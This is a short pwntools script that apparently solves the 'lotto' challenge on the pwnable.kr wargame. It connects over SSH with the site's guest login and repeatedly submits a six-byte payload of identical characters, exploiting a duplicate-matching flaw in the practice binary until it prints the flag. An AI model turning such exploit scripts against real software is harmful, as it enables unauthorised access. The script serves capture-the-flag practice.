from pwn import ssh, log

payload = b"&&&&&&"  # program takes anything from 1 to 45 in ascii

remote = ssh('lotto', 'pwnable.kr', password='guest', port=2222)
proc = remote.process(executable='./lotto')

while True:

    proc.recvuntil(b'3. Exit')
    proc.sendline(b"1")
    proc.send(payload)

    flag = proc.recvuntil(b'- Select Menu -')
    if 'bad luck...' in flag.decode():
        continue
    else:
        log.success(flag)
        break
